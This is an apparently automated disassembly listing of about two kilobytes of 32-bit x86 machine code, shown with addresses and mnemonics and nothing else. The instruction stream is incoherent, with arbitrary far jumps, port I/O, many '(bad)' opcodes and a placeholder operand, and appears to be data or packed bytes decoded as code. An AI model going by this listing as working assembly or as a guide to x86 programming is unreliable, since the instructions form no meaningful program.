  41b3e5:	lods   al,BYTE PTR ds:[esi]
  41b3e6:	xchg   esp,eax
  41b3e7:	cwde   
  41b3e8:	jecxz  0x41b418
  41b3ea:	xor    ah,ah
  41b3ec:	arpl   WORD PTR [edi-0x456ea808],di
  41b3f2:	dec    eax
  41b3f3:	dec    ebp
  41b3f4:	loopne 0x41b3b9
  41b3f6:	jmp    0x745d:0xb8585a55
  41b3fd:	es inc eax
  41b3ff:	int    0x16
  41b401:	push   0x11448bcf
  41b406:	js     0x41b43d
  41b408:	dec    ebp
  41b409:	mov    cl,0xf1
  41b40b:	inc    edx
  41b40c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b40d:	out    0x9f,eax
  41b40f:	jp     0x41b39e
  41b411:	sub    al,0xd5
  41b413:	data16 neg BYTE PTR [edx-0x86825e9]
  41b41a:	mov    ah,BYTE PTR ds:0x5aad32a8
  41b420:	ins    BYTE PTR es:[edi],dx
  41b421:	cwde   
  41b422:	dec    ecx
  41b423:	jno    0x41b3cf
  41b425:	push   0xffffffdf
  41b427:	lods   al,BYTE PTR ds:[esi]
  41b428:	retf   0x5ba5
  41b42b:	jmp    0x20a6:0x5956d8d2
  41b432:	lahf   
  41b433:	mov    BYTE PTR [ebx+0x68],cl
  41b436:	jp     0x41b3c4
  41b438:	inc    ecx
  41b439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b43a:	dec    esi
  41b43b:	mul    DWORD PTR [ebp+0x54ba633]
  41b441:	inc    ebp
  41b442:	and    bl,BYTE PTR [ebx-0x72b04ae2]
  41b448:	mov    edi,0xc484b2eb
  41b44d:	xchg   ecx,eax
  41b44e:	(bad)  
  41b450:	stos   BYTE PTR es:[edi],al
  41b451:	sub    DWORD PTR [edx-0x77],0x65
  41b455:	fsubr  DWORD PTR [ecx-0x6d]
  41b458:	neg    BYTE PTR [ebx-0x6f1a1252]
  41b45e:	dec    ecx
  41b45f:	dec    ebp
  41b460:	mov    dh,0xff
  41b462:	ss ins DWORD PTR es:[edi],dx
  41b464:	add    eax,0x6ef434cf
  41b469:	scas   eax,DWORD PTR es:[edi]
  41b46a:	pop    ds
  41b46b:	dec    esp
  41b46c:	sbb    BYTE PTR [ebx-0x7f],dh
  41b46f:	xlat   BYTE PTR ds:[ebx]
  41b470:	dec    esi
  41b471:	push   edx
  41b472:	jns    0x41b4a5
  41b474:	mov    al,0xb3
  41b476:	pushf  
  41b477:	clc    
  41b478:	adc    BYTE PTR [edx-0x6a2ee8a6],dl
  41b47e:	aam    0x88
  41b480:	mov    cl,0xae
  41b482:	inc    ecx
  41b483:	test   eax,0x47f1b119
  41b488:	add    BYTE PTR [edx],bh
  41b48a:	jno    0x41b43f
  41b48c:	and    eax,0x5401483d
  41b491:	js     0x41b460
  41b493:	mov    esp,0x77e62949
  41b498:	mov    eax,ds
  41b49a:	push   0x872adff9
  41b49f:	mov    al,0x52
  41b4a1:	arpl   WORD PTR [eax],si
  41b4a3:	xchg   ebp,eax
  41b4a4:	addr16 xchg ecx,eax
  41b4a6:	pop    ecx
  41b4a7:	mov    esi,DWORD PTR [edi-0x77752fb]
  41b4ad:	pop    ss
  41b4ae:	sub    cl,dl
  41b4b0:	mov    edi,0xce99e244
  41b4b5:	dec    ecx
  41b4b6:	out    0x99,eax
  41b4b8:	div    DWORD PTR [edx-0x494929c4]
  41b4be:	xor    DWORD PTR [eax+0x98be1b0],eax
  41b4c4:	push   ebx
  41b4c5:	popa   
  41b4c6:	dec    edx
  41b4c7:	sbb    dh,BYTE PTR [esp+edx*4+0x79fe7e93]
  41b4ce:	lods   eax,DWORD PTR ds:[esi]
  41b4cf:	loopne 0x41b50b
  41b4d1:	shl    DWORD PTR [eax-0x25538abd],0x7a
  41b4d8:	popa   
  41b4d9:	fidivr DWORD PTR [ecx+0x3]
  41b4dc:	adc    eax,0x21d433fb
  41b4e1:	div    BYTE PTR ds:[ecx-0x4b53d7cc]
  41b4e8:	xor    BYTE PTR [ecx-0xace11be],0xcb
  41b4ef:	xchg   ebx,eax
  41b4f0:	mov    ds,WORD PTR [esi+0x20d8aa6f]
  41b4f6:	into   
  41b4f7:	imul   edi,DWORD PTR ds:0x1f257634,0x7b30d399
  41b501:	out    dx,al
  41b502:	xchg   ebx,eax
  41b503:	lahf   
  41b504:	inc    ebx
  41b505:	mov    eax,0xe35f429a
  41b50a:	mov    DWORD PTR [edx-0x5b00682f],0xa6bc8fa6
  41b514:	xor    eax,0xfc81c774
  41b519:	mov    ecx,0x4994f43a
  41b51e:	in     al,0x28
  41b520:	push   es
  41b521:	sbb    ecx,DWORD PTR [edx]
  41b523:	jecxz  0x41b56e
  41b525:	and    DWORD PTR [ebp+0x4bcd4afc],0x1d7cfdf1
  41b52f:	lock pop esi
  41b531:	sbb    eax,0x201d9a7
  41b536:	aam    0xed
  41b538:	inc    edi
  41b539:	xor    BYTE PTR [edx],ah
  41b53b:	ss pop edx
  41b53d:	mov    BYTE PTR [ebx+0x1e],0x8
  41b541:	pop    ebx
  41b542:	and    al,0x20
  41b544:	adc    dl,ah
  41b546:	mov    bl,BYTE PTR [eax+eiz*1+0x4a26eb20]
  41b54d:	xchg   ebp,eax
  41b54e:	das    
  41b54f:	arpl   WORD PTR [eax+eiz*1-0x393cfcd2],di
  41b556:	xchg   ebp,ebx
  41b558:	or     dh,BYTE PTR [esi]
  41b55a:	sub    DWORD PTR ss:[edx+ebx*2],ecx
  41b55e:	outs   dx,BYTE PTR ds:[esi]
  41b55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b560:	mov    ecx,0x9f11d148
  41b565:	and    ebx,DWORD PTR [ecx+0x46]
  41b568:	add    edx,esi
  41b56a:	cmp    eax,0x744ecfff
  41b56f:	push   esi
  41b570:	(bad)  
  41b571:	ss pusha 
  41b573:	or     eax,0x692992cc
  41b578:	call   0xe3b4:0xb7dc6c2d
  41b57f:	scas   al,BYTE PTR es:[edi]
  41b580:	test   eax,0xe8b3702c
  41b585:	pop    ds
  41b586:	loope  0x41b55c
  41b588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b589:	in     eax,0x8f
  41b58b:	lea    ecx,[edx+edx*8+0x2b]
  41b58f:	sti    
  41b590:	xor    BYTE PTR [eax+edx*2-0x9],bh
  41b594:	fcmovb st,st(2)
  41b596:	pop    ss
  41b597:	sub    ch,BYTE PTR [edx]
  41b599:	cmp    ebx,DWORD PTR [eax-0x78ba9f41]
  41b59f:	inc    ebx
  41b5a0:	cmc    
  41b5a1:	or     cl,BYTE PTR [edi]
  41b5a3:	mov    ah,0x81
  41b5a5:	in     eax,dx
  41b5a6:	mov    BYTE PTR [edx-0x7508f56c],ah
  41b5ac:	jb     0x41b5e8
  41b5ae:	shr    DWORD PTR [edx+0x7a133f5e],0x34
  41b5b5:	fld    TBYTE PTR [eax-0x3]
  41b5b8:	or     BYTE PTR [ebx+ecx*1+0x359c0664],al
  41b5bf:	ret    
  41b5c0:	jbe    0x41b552
  41b5c2:	or     eax,0x9985b969
  41b5c7:	adc    al,0xe8
  41b5c9:	mov    edx,0x31a8c15b
  41b5ce:	xchg   ecx,eax
  41b5cf:	push   edx
  41b5d0:	packssdw mm7,QWORD PTR [edx]
  41b5d3:	xor    BYTE PTR [ecx+0x7b],dl
  41b5d6:	ret    0x8b28
  41b5d9:	clc    
  41b5da:	mov    dh,0x65
  41b5dc:	xchg   ebp,eax
  41b5dd:	popa   
  41b5de:	push   0x4117dc78
  41b5e3:	mov    bl,0xa3
  41b5e5:	cdq    
  41b5e6:	(bad)
  41b5e9:	sahf   
  41b5ea:	dec    ebx
  41b5eb:	inc    esp
  41b5ec:	addr16 lahf 
  41b5ee:	fiadd  DWORD PTR [ebx]
  41b5f0:	cmp    al,0x83
  41b5f2:	fisubr DWORD PTR [edi-0x2d]
  41b5f5:	and    ebp,DWORD PTR [edx]
  41b5f7:	jle    0x41b66e
  41b5f9:	int    0xfb
  41b5fb:	pop    esp
  41b5fc:	jg     0x41b5b7
  41b5fe:	xchg   edi,eax
  41b5ff:	xchg   esi,eax
  41b600:	jmp    0x79ae4c7c
  41b605:	inc    eax
  41b606:	add    esp,DWORD PTR ds:0x5e5a62d
  41b60c:	adc    BYTE PTR [edi+eiz*4+0x6028306],bl
  41b613:	frstor [ebx+0xc213a68]
  41b619:	inc    esi
  41b61a:	ficomp DWORD PTR [ebp+0x2f]
  41b61d:	push   ebp
  41b61e:	nop
  41b61f:	mov    ebx,?
  41b621:	fmul   DWORD PTR [edx+0x3add5b5b]
  41b627:	ret    0x4b56
  41b62a:	(bad)  
  41b62b:	pop    ecx
  41b62c:	and    bl,al
  41b62e:	sbb    al,bl
  41b630:	cmp    edx,DWORD PTR [edi]
  41b632:	mov    ecx,0x740b32c9
  41b637:	cmp    ah,bh
  41b639:	cli    
  41b63a:	in     al,dx
  41b63b:	cwde   
  41b63c:	cmp    al,BYTE PTR [ebx+edi*4+0x4440f996]
  41b643:	mov    WORD PTR [ebx-0x1efef546],es
  41b649:	fistp  WORD PTR [ebx]
  41b64b:	neg    BYTE PTR [edi+edi*1-0x6d]
  41b64f:	adc    BYTE PTR [edi+0x4a35cb54],al
  41b655:	jle    0x41b5da
  41b657:	fstp   DWORD PTR es:[ecx]
  41b65a:	ins    BYTE PTR es:[edi],dx
  41b65b:	nop
  41b65c:	mov    ds:0xcca38fdf,eax
  41b661:	inc    ecx
  41b662:	xor    esi,DWORD PTR [edi+0x3b]
  41b665:	mov    ah,dl
  41b667:	and    edi,DWORD PTR [eax+0x3a17e0cf]
  41b66d:	stos   DWORD PTR es:[edi],eax
  41b66e:	in     eax,dx
  41b66f:	ds push cs
  41b671:	fistp  QWORD PTR [ecx-0x1b]
  41b674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b676:	test   eax,0x549519fb
  41b67b:	adc    ecx,DWORD PTR [ebx]
  41b67d:	cmp    DWORD PTR [ebx+0x3a28a2dc],esp
  41b683:	fidiv  DWORD PTR [esi+0x1f]
  41b686:	js     0x41b6a1
  41b688:	add    al,0x70
  41b68a:	lods   eax,DWORD PTR ds:[esi]
  41b68b:	mov    dh,0x4f
  41b68d:	jbe    0x41b60f
  41b68f:	dec    edi
  41b690:	fcomip st,st(0)
  41b692:	sub    eax,0xd4941567
  41b697:	xchg   edx,eax
  41b698:	rcr    BYTE PTR [ebx],0x1d
  41b69b:	into   
  41b69c:	scas   al,BYTE PTR es:[edi]
  41b69d:	hlt    
  41b69e:	or     ch,0xe4
  41b6a1:	jno    0x41b65a
  41b6a3:	jns    0x41b635
  41b6a5:	call   0x8e3d:0x7cf71d26
  41b6ac:	mov    al,BYTE PTR [esi+0x209603fb]
  41b6b2:	xacquire xchg DWORD PTR [esi+0x52],eax
  41b6b6:	fist   DWORD PTR [eax]
  41b6b8:	fistp  DWORD PTR [esi]
  41b6ba:	push   esp
  41b6bb:	jne    0x41b6a2
  41b6bd:	mov    ecx,0x19e909d9
  41b6c2:	fcom   DWORD PTR [ecx+0x69]
  41b6c5:	std    
  41b6c6:	cdq    
  41b6c7:	adc    bl,bh
  41b6c9:	xchg   esi,eax
  41b6ca:	gs cmc 
  41b6cc:	adc    ebp,DWORD PTR [edx]
  41b6ce:	clc    
  41b6cf:	call   0x33d8:0x99a274b1
  41b6d6:	xchg   esi,eax
  41b6d7:	cmp    BYTE PTR [eax-0x5a],cl
  41b6da:	data16 jne 0x41b71d
  41b6dd:	les    edx,FWORD PTR [eax-0x46]
  41b6e0:	call   0x18aa8769
  41b6e5:	mul    esp
  41b6e7:	inc    ebx
  41b6e8:	stos   BYTE PTR es:[edi],al
  41b6e9:	add    DWORD PTR [bx+si],0xffffffce
  41b6ed:	push   0x144aca87
  41b6f2:	pop    esi
  41b6f3:	pop    ecx
  41b6f4:	sub    DWORD PTR [esi-0x6a],ecx
  41b6f7:	retf   
  41b6f8:	mov    ds:0x983d1907,eax
  41b6fd:	add    al,0x14
  41b6ff:	xor    al,0x42
  41b701:	shl    bl,0xed
  41b704:	test   edi,esi
  41b706:	push   cs
  41b707:	xor    DWORD PTR [edi],ebx
  41b709:	rol    BYTE PTR [edi+ebx*2+0x11e781b8],0x34
  41b711:	adc    al,0x17
  41b713:	inc    edx
  41b714:	int    0xe8
  41b716:	stos   BYTE PTR es:[edi],al
  41b717:	dec    edi
  41b718:	xor    BYTE PTR [eax+0x6c3a9faa],dh
  41b71e:	mov    cl,0x7c
  41b720:	loop   0x41b71d
  41b722:	xchg   DWORD PTR [edi+0x3823fcce],edi
  41b728:	sbb    BYTE PTR cs:[edx+0x1c6dc744],dh
  41b72f:	cmp    DWORD PTR ss:[ebx+0x36],esp
  41b733:	iret   
  41b734:	fs xchg edi,eax
  41b736:	cli    
  41b737:	call   0x1de9:0x8d8ac9c8
  41b73e:	cmp    al,0x77
  41b740:	ins    DWORD PTR es:[edi],dx
  41b741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b742:	idiv   BYTE PTR [ecx+0x6a]
  41b745:	bswap  ecx
  41b747:	lds    edi,FWORD PTR [eax+0x1bd50417]
  41b74d:	test   eax,0xfd141250
  41b752:	iret   
  41b753:	cmp    esi,DWORD PTR [ebx]
  41b755:	aam    0x65
  41b757:	dec    edi
  41b758:	cli    
  41b759:	fild   WORD PTR [ebp+0x65a4e72e]
  41b75f:	push   0x57
  41b761:	sbb    DWORD PTR [ebx],esi
  41b763:	sub    ah,BYTE PTR [esi-0x18]
  41b766:	adc    ah,dl
  41b768:	or     BYTE PTR [esi+0x67],dh
  41b76b:	iret   
  41b76c:	inc    ebp
  41b76d:	add    al,0x5f
  41b76f:	jg     0x41b761
  41b771:	mov    al,0x8a
  41b773:	pop    ebx
  41b774:	and    DWORD PTR [esi-0x72],ecx
  41b777:	mov    ds:0xb3e9a623,eax
  41b77c:	test   DWORD PTR [edx-0x6b6028c4],eax
  41b782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b783:	mov    ds,ebp
  41b785:	sub    bh,ah
  41b787:	adc    eax,0x62dce5b3
  41b78c:	popf   
  41b78d:	jle    0x41b76d
  41b78f:	mov    edx,0x71dcce3e
  41b794:	(bad)  
  41b795:	mov    ah,0x9a
  41b797:	or     BYTE PTR [ecx-0x2964d818],bh
  41b79d:	push   eax
  41b79e:	mul    BYTE PTR [edi]
  41b7a0:	xor    al,0x29
  41b7a2:	call   0x542:0xd9c48dd6
  41b7a9:	dec    ebp
  41b7aa:	jb     0x41b808
  41b7ac:	retf   0x5489
  41b7af:	inc    ebx
  41b7b0:	sbb    ah,dh
  41b7b2:	ret    
  41b7b3:	(bad)  
  41b7b4:	pop    ecx
  41b7b5:	inc    eax
  41b7b6:	fcomp  st(1)
  41b7b8:	aaa    
  41b7b9:	xor    dl,bh
  41b7bb:	jne    0x41b82e
  41b7bd:	fnsave [eax]
  41b7bf:	xchg   esi,eax
  41b7c0:	jmp    0xb62c:0x1b5ad2e
  41b7c7:	leave  
  41b7c8:	and    BYTE PTR [ebp-0x69636d4f],bh
  41b7ce:	pop    edx
  41b7cf:	sbb    eax,0x96d4eba2
  41b7d4:	jg     0x41b7e9
  41b7d6:	test   eax,0xdd257e19
  41b7db:	mov    BYTE PTR [ebx-0x28f465de],al
  41b7e1:	in     al,0xf
  41b7e3:	or     al,0xec
  41b7e5:	lods   eax,DWORD PTR ds:[esi]
  41b7e6:	pop    ebx
  41b7e7:	sbb    eax,0x46e0f100
  41b7ec:	cdq    
  41b7ed:	nop
  41b7ee:	jmp    0xbdeb07e9
  41b7f3:	addr16 loopne 0x41b807
  41b7f6:	sbb    DWORD PTR [ebx+0x3c04fced],0xfffffffb
  41b7fd:	cmp    BYTE PTR [ebp-0x2876f134],ch
  41b803:	mov    edi,0x6204fac0
  41b808:	jl     0x41b889
  41b80a:	aas    
  41b80b:	daa    
  41b80c:	xchg   esi,eax
  41b80d:	mov    ebx,0x98520f3
  41b812:	or     DWORD PTR [edx+0x75],ecx
  41b815:	jmp    0x725b:0x4be5c6d2
  41b81c:	test   DWORD PTR [edi-0x33],eax
  41b81f:	jg     0x41b81e
  41b821:	sahf   
  41b822:	add    eax,0x9d39059
  41b827:	adc    eax,0xcacab521
  41b82c:	fidiv  DWORD PTR [edi-0x1552ebb4]
  41b832:	mov    ebx,0x416c783
  41b837:	ret    
  41b838:	push   DWORD PTR [ecx+0x180d1a38]
  41b83e:	pop    es
  41b83f:	fldpi  
  41b841:	repnz ins BYTE PTR es:[edi],dx
  41b843:	(bad)  
  41b844:	xchg   esi,eax
  41b845:	ret    0x6322
  41b848:	popf   
  41b849:	mov    bl,0x62
  41b84b:	(bad)  
  41b84c:	addr16 rcl esi,cl
  41b84f:	and    ebp,esi
  41b851:	add    dh,dh
  41b853:	or     eax,0xbdcd728a
  41b858:	popa   
  41b859:	mov    edi,0xc3315b55
  41b85e:	cs pop ebp
  41b860:	pusha  
  41b861:	es push ss
  41b863:	sahf   
  41b864:	call   0x8582ae8d
  41b869:	sub    ecx,ebp
  41b86b:	loopne 0x41b8a2
  41b86d:	xchg   esi,eax
  41b86e:	mov    esi,0xb323339c
  41b873:	js     0x41b8d9
  41b875:	jecxz  0x41b82d
  41b877:	mov    al,0x48
  41b879:	cli    
  41b87a:	and    eax,0xa64d347f
  41b87f:	leave  
  41b880:	cli    
  41b881:	icebp  
  41b882:	mov    ah,0x5f
  41b884:	add    dl,BYTE PTR [esi-0x76]
  41b887:	dec    eax
  41b888:	jno    0x41b855
  41b88a:	ror    DWORD PTR [edi+esi*8-0x1],1
  41b88e:	mov    dh,BYTE PTR ds:0x3da4e606
  41b894:	ror    BYTE PTR [edi+0x5126f59],0x9d
  41b89b:	fiadd  WORD PTR [edx-0x2e]
  41b89e:	daa    
  41b89f:	or     DWORD PTR [ebx],ecx
  41b8a1:	je     0x41b8b8
  41b8a3:	pop    ecx
  41b8a4:	out    0xac,eax
  41b8a6:	push   ds
  41b8a7:	dec    cl
  41b8a9:	xlat   BYTE PTR ds:[ebx]
  41b8aa:	push   ss
  41b8ab:	popf   
  41b8ac:	cmp    BYTE PTR [edi-0x3b713523],ah
  41b8b2:	xor    al,0x61
  41b8b4:	dec    ebx
  41b8b5:	mov    ebp,0xcab77b52
  41b8ba:	mov    edx,0x51fdab5e
  41b8bf:	shl    cl,0x49
  41b8c2:	mov    cl,BYTE PTR [ebx]
  41b8c4:	jl     0x41b922
  41b8c6:	addr16 cld 
  41b8c8:	jmp    0x77e09824
  41b8cd:	cdq    
  41b8ce:	clc    
  41b8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8d0:	mov    ds:0x20f2720c,al
  41b8d5:	pop    esi
  41b8d6:	cwde   
  41b8d7:	push   esp
  41b8d8:	xchg   edx,eax
  41b8d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8da:	rcr    DWORD PTR [eax+ebp*1+0x46],0xd0
  41b8df:	fs cwde 
  41b8e1:	dec    eax
  41b8e2:	jno    0x41b92f
  41b8e4:	sbb    eax,edi
  41b8e6:	cmp    eax,0x47c1511f
  41b8eb:	jns    0x41b8f2
  41b8ed:	push   esi
  41b8ee:	xchg   esi,eax
  41b8ef:	pop    eax
  41b8f0:	or     BYTE PTR [esi],ch
  41b8f2:	lds    ecx,FWORD PTR [esp+esi*1-0x480141e1]
  41b8f9:	loop   0x41b8b1
  41b8fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8fc:	retf   
  41b8fd:	outs   dx,BYTE PTR ds:[esi]
  41b8fe:	frstpm(287 only) 
  41b900:	iret   
  41b901:	push   DWORD PTR [eax]
  41b903:	sub    esi,esi
  41b905:	in     al,0x22
  41b907:	mov    ecx,0xd4224117
  41b90c:	add    BYTE PTR ds:0xee425c09,dl
  41b912:	mov    esi,es
  41b914:	aam    0xf2
  41b916:	push   0xffffff8b
  41b918:	mov    edx,0x770a9bb7
  41b91d:	xor    edi,DWORD PTR [esi+0x3f]
  41b920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b921:	lods   eax,DWORD PTR ds:[esi]
  41b922:	add    cl,BYTE PTR [esi-0x6a0db6a8]
  41b928:	outs   dx,DWORD PTR ds:[esi]
  41b929:	mov    ecx,0xeee6d5b2
  41b92e:	adc    al,0xba
  41b930:	das    
  41b931:	inc    esp
  41b932:	and    al,0xb1
  41b934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b935:	shr    DWORD PTR [edi+0x42],cl
  41b938:	dec    edi
  41b939:	jle    0x41b975
  41b93b:	inc    ebx
  41b93c:	popf   
  41b93d:	mov    ds:0x6b877ec5,eax
  41b942:	pop    ebp
  41b943:	in     eax,dx
  41b944:	sub    al,0x1d
  41b946:	ss inc ebp
  41b948:	(bad)  
  41b949:	lods   eax,DWORD PTR ds:[esi]
  41b94a:	inc    edi
  41b94b:	ja     0x41b95b
  41b94d:	aam    0x17
  41b94f:	and    ebp,DWORD PTR [edx+0x3c287d1e]
  41b955:	push   esp
  41b956:	(bad)  [ebp+edi*8-0xf]
  41b95a:	and    eax,0xcd78ee3d
  41b95f:	out    dx,eax
  41b960:	(bad)
  41b964:	call   0x9d0c:0xc8c4d37
  41b96b:	jbe    0x41b94f
  41b96d:	push   ebp
  41b96e:	mov    BYTE PTR [edi],bh
  41b970:	jge    0x41b954
  41b972:	sbb    DWORD PTR [edx-0x3fc91f6e],ecx
  41b978:	lea    edx,[esi-0x65a74ee8]
  41b97e:	cld    
  41b97f:	int3   
  41b980:	ja     0x41b978
  41b982:	xchg   BYTE PTR [eax],bh
  41b984:	push   0x3a12fdcd
  41b989:	ret    
  41b98a:	or     al,0x21
  41b98c:	jne    0x41b912
  41b98e:	stos   BYTE PTR es:[edi],al
  41b98f:	inc    edx
  41b990:	push   ebp
  41b991:	push   edi
  41b992:	js     0x41b972
  41b994:	xchg   esi,eax
  41b995:	push   ss
  41b996:	ror    DWORD PTR [esi+0x7b],cl
  41b999:	dec    ecx
  41b99a:	jmp    0xda1359c0
  41b99f:	and    eax,0x200c3cd2
  41b9a4:	xor    BYTE PTR [edi+0x91cda42],0xbd
  41b9ab:	loope  0x41ba03
  41b9ad:	in     eax,dx
  41b9ae:	lea    ebp,[ebx]
  41b9b0:	retf   
  41b9b1:	iret   
  41b9b2:	mov    ds:0x466e78e0,eax
  41b9b7:	test   eax,0x98edc5ec
  41b9bc:	xor    dh,BYTE PTR [esi]
  41b9be:	iret   
  41b9bf:	aad    0xae
  41b9c1:	jns    0x41b9d5
  41b9c3:	xchg   esp,esi
  41b9c5:	sbb    al,0x6
  41b9c7:	inc    edi
  41b9c8:	inc    eax
  41b9c9:	out    dx,eax
  41b9ca:	sub    bl,dl
  41b9cc:	(bad)  
  41b9cd:	push   esi
  41b9cf:	mov    eax,ds:0x2c5a5d32
  41b9d4:	mov    ah,0xa3
  41b9d6:	ror    BYTE PTR ds:0x73b0b9db,cl
  41b9dc:	ds or  dl,bh
  41b9df:	nop
  41b9e0:	out    dx,eax
  41b9e1:	test   eax,0xc9562a1c
  41b9e6:	stc    
  41b9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9e8:	test   DWORD PTR [edx+0x5d],ecx
  41b9eb:	add    al,0x9c
  41b9ed:	add    eax,0xb2e7cf2b
  41b9f2:	and    BYTE PTR [ebp-0x79],ah
  41b9f5:	mov    esi,0xc00859d5
  41b9fa:	xor    eax,0xfdf175de
  41b9ff:	xor    dh,bl
  41ba01:	imul   eax,DWORD PTR [ebp+0x5],0xbba10fb3
  41ba08:	pop    edi
  41ba09:	dec    ebp
  41ba0a:	retfw  0xf76e
  41ba0e:	leave  
  41ba0f:	mov    bl,0x96
  41ba11:	pushf  
  41ba12:	imul   ebp,DWORD PTR [ebp+0x40867605],0xc2127bf1
  41ba1c:	mov    edx,0xbc3593a4
  41ba21:	leave  
  41ba22:	dec    esi
  41ba23:	adc    DWORD PTR [ebx-0x65012b89],0xa72d6d67
  41ba2d:	jne    0x41ba91
  41ba2f:	ja     0x41b9fb
  41ba31:	in     eax,dx
  41ba32:	sbb    dl,ah
  41ba34:	inc    ebp
  41ba35:	popa   
  41ba36:	leave  
  41ba37:	adc    al,0xf
  41ba39:	hlt    
  41ba3a:	in     al,dx
  41ba3b:	jno    0x41ba46
  41ba3d:	sub    al,0x1a
  41ba3f:	jns    0x41ba54
  41ba41:	in     eax,dx
  41ba42:	or     cl,bh
  41ba44:	out    0x3a,eax
  41ba46:	push   es
  41ba47:	scas   eax,DWORD PTR es:[edi]
  41ba48:	hlt    
  41ba49:	mov    ah,ch
  41ba4b:	mov    ah,0x4b
  41ba4d:	adc    eax,0xa1e9a0c5
  41ba52:	jnp    0x41ba6a
  41ba54:	cmp    DWORD PTR [esi-0x5456c5d9],ebp
  41ba5a:	sahf   
  41ba5b:	in     eax,0x78
  41ba5d:	mov    DWORD PTR [edi],esi
  41ba5f:	dec    esi
  41ba60:	mov    dl,0xbd
  41ba62:	push   ebp
  41ba63:	push   ebp
  41ba64:	fldcw  WORD PTR [edi]
  41ba66:	int    0x8
  41ba68:	mov    BYTE PTR [ecx],cl
  41ba6a:	mov    edi,0xf8def3b5
  41ba6f:	fdivr  st(3),st
  41ba71:	stos   BYTE PTR es:[edi],al
  41ba72:	rcl    BYTE PTR [edi],1
  41ba74:	ficomp DWORD PTR [ebx]
  41ba76:	xchg   esp,eax
  41ba77:	jmp    0x41ba0f
  41ba79:	lods   eax,DWORD PTR ds:[esi]
  41ba7a:	call   0xb6a5c809
  41ba7f:	inc    ebp
  41ba80:	and    al,0xc4
  41ba82:	shr    DWORD PTR [ecx-0x36d8b77f],cl
  41ba88:	(bad)  
  41ba89:	sbb    BYTE PTR [edx+eiz*2+0x4ddccaa5],ch
  41ba90:	jp     0x41ba44
  41ba92:	pop    ss
  41ba93:	inc    ecx
  41ba94:	pop    ebp
  41ba95:	pop    ebp
  41ba96:	mov    DWORD PTR [edx-0x3c],edx
  41ba99:	stc    
  41ba9a:	icebp  
  41ba9b:	ja     0x41bb03
  41ba9d:	and    BYTE PTR [eax+ecx*4-0xb],0xbc
  41baa2:	xchg   ebx,eax
  41baa3:	push   edx
  41baa4:	scas   eax,DWORD PTR es:[edi]
  41baa5:	mov    edi,0x2629fdeb
  41baaa:	add    bl,BYTE PTR [eax+0x5adce2e2]
  41bab0:	push   esi
  41bab1:	xchg   BYTE PTR [eax+0x43],ah
  41bab4:	aaa    
  41bab5:	cmp    ebp,DWORD PTR [ecx-0x54]
  41bab8:	cdq    
  41bab9:	cmp    al,0x71
  41babb:	pop    ds
  41babc:	stos   DWORD PTR es:[edi],eax
  41babd:	(bad)  
  41babe:	jne    0x41bb30
  41bac0:	sbb    esp,edx
  41bac2:	or     eax,0xb4b36ff9
  41bac7:	aad    0x3c
  41bac9:	adc    ebp,0xffffff80
  41bacc:	jmp    0x41ba77
  41bace:	xor    eax,0xa271468c
  41bad3:	cmp    bh,ch
  41bad5:	mov    cl,0x53
  41bad7:	fld    QWORD PTR [ebx+0x2e]
  41bada:	retf   0xf826
  41badd:	js     0x41bae7
  41badf:	fs cmp al,0xd0
  41bae2:	rcl    DWORD PTR [edi+0x23],cl
  41bae5:	loope  0x41bad2
  41bae7:	stos   BYTE PTR es:[edi],al
  41bae8:	sbb    eax,0x626a828c
  41baed:	or     DWORD PTR ds:0x47d11b22,esi
  41baf3:	lahf   
  41baf4:	jmp    0x8a9cf40a
  41baf9:	mov    ebp,0x7f46fcf
  41bafe:	adc    esp,esi
  41bb00:	les    edx,FWORD PTR [bx+si-0x21f4]
  41bb05:	fimul  DWORD PTR [ebp+edx*8+0x51c18c04]
  41bb0c:	mov    edi,0xd4c15020
  41bb11:	pcmpeqw mm2,QWORD PTR [esp+edi*1-0x40b13c8d]
  41bb19:	push   0x9115da90
  41bb1e:	pop    ecx
  41bb1f:	pop    esi
  41bb20:	test   DWORD PTR [ebx-0x5b2554a8],esi
  41bb26:	test   al,0x4d
  41bb28:	push   ebx
  41bb29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb2a:	pusha  
  41bb2b:	sbb    esi,esp
  41bb2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb2e:	nop
  41bb2f:	loop   0x41bab3
  41bb31:	sbb    ch,al
  41bb33:	mov    esp,DWORD PTR [edi+0xbcdbe26]
  41bb39:	cwde   
  41bb3a:	bound  esi,QWORD PTR [eax]
  41bb3c:	cwde   
  41bb3d:	sbb    al,0x2
  41bb3f:	jmp    0xbae3:0x298937cf
  41bb46:	add    al,0x74
  41bb48:	add    BYTE PTR [ecx+eax*1],0xfe
  41bb4c:	gs add al,0xde
  41bb4f:	or     ch,BYTE PTR [edx]
  41bb51:	shl    BYTE PTR [edx+0x6089572c],0x7f
  41bb58:	imul   ebp,DWORD PTR [eax],0x3d94a9fd
  41bb5e:	mov    esp,0x5039a8f3
  41bb63:	adc    eax,0x4c017a13
  41bb68:	sbb    al,BYTE PTR [esi]
  41bb6a:	pop    ss
  41bb6b:	mov    ecx,ecx
  41bb6d:	rol    dh,0x77
  41bb70:	adc    ecx,DWORD PTR ds:0x509a411a
  41bb76:	xor    dh,bl
  41bb78:	rcr    BYTE PTR [eax],cl
  41bb7a:	shl    edx,0xbe
  41bb7d:	xabort 0xc3
  41bb80:	push   0x1dad6df1
  41bb85:	mov    ecx,0x93bf246a
  41bb8a:	int    0xf9
  41bb8c:	xor    BYTE PTR [ecx-0x7b],bl
  41bb8f:	push   0x6c73f2a0
  41bb94:	cmp    bl,BYTE PTR [ebp+0x87fa660]
  41bb9a:	inc    edi
